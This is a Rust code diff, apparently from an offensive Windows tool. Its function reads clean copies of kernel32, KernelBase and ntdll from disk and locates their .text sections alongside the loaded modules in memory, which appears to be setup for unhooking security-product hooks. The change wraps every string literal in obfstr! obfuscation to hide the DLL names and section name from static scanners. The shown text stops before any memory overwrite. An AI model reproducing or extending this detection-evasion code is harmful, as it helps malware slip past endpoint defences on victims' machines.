@@ -2,19 +2,20 @@ use std::fs;
 use std::ffi::c_void;
 use goblin::pe::PE;
 
+
 use crate::stdlib::get_wide;
 
 pub fn refresh_dlls() {
     // load dlls
-    let kernel32_bytes = match fs::read("C:\\Windows\\System32\\kernel32.dll") {
+    let kernel32_bytes = match fs::read(obfstr::obfstr!("C:\\Windows\\System32\\kernel32.dll")) {
         Err(_) => return,
         Ok(kernel32) => kernel32,
     };
-    let kernelbase_bytes = match fs::read("C:\\Windows\\System32\\KernelBase.dll") {
+    let kernelbase_bytes = match fs::read(obfstr::obfstr!("C:\\Windows\\System32\\KernelBase.dll")) {
         Err(_) => return,
         Ok(kernel32) => kernel32,
     };
-    let ntdll_bytes = match fs::read("C:\\Windows\\System32\\ntdll.dll") {
+    let ntdll_bytes = match fs::read(obfstr::obfstr!("C:\\Windows\\System32\\ntdll.dll")) {
         Err(_) => return,
         Ok(ntdll) => ntdll,
     };
@@ -30,29 +31,29 @@ pub fn refresh_dlls() {
     let mut ntdll_text_ptr: *mut c_void = 0 as _;
     let mut ntdll_text_size: usize = 0;
     for i in 0..kernel32.sections.len() {
-        if kernel32.sections[i].name().unwrap() == ".text" {
+        if kernel32.sections[i].name().unwrap() == obfstr::obfstr!(".text") {
             k32_text_ptr = kernel32.sections[i].pointer_to_raw_data as *mut c_void;
             k32_text_size = kernel32.sections[i].size_of_raw_data as usize;
             break;
         }
     }
     for i in 0..kernelbase.sections.len() {
-        if kernelbase.sections[i].name().unwrap() == ".text" {
+        if kernelbase.sections[i].name().unwrap() == obfstr::obfstr!(".text") {
             kernelbase_text_ptr = kernelbase.sections[i].pointer_to_raw_data as *mut c_void;
             kernelbase_text_size = kernelbase.sections[i].size_of_raw_data as usize;
             break;
         }
     }
     for i in 0..ntdll.sections.len() {
-        if ntdll.sections[i].name().unwrap() == ".text" {
+        if ntdll.sections[i].name().unwrap() == obfstr::obfstr!(".text") {
             ntdll_text_ptr = ntdll.sections[i].pointer_to_raw_data as *mut c_void;
             ntdll_text_size = ntdll.sections[i].size_of_raw_data as usize;
             break;
         }
     }
     // get dll handles
-    let loaded_k32 = unsafe {winapi::um::libloaderapi::LoadLibraryExW(get_wide("kernel32.dll").as_ptr(), 0 as _, 0 as _)};
-    let loaded_ntdll = unsafe {winapi::um::libloaderapi::LoadLibraryExW(get_wide("ntdll.dll").as_ptr(), 0 as _, 0 as _)};
+    let loaded_k32 = unsafe {winapi::um::libloaderapi::LoadLibraryExW(get_wide(obfstr::obfstr!("kernel32.dll")).as_ptr(), 0 as _, 0 as _)};
+    let loaded_ntdll = unsafe {winapi::um::libloaderapi::LoadLibraryExW(get_wide(obfstr::obfstr!("ntdll.dll")).as_ptr(), 0 as _, 0 as _)};
     // get .text address of dll
     let loaded_k32_text = unsafe{(loaded_k32 as *mut c_void).offset(0x1000)};
     let loaded_ntdll_text = unsafe{(loaded_ntdll as *mut c_void).offset(0x1000)};
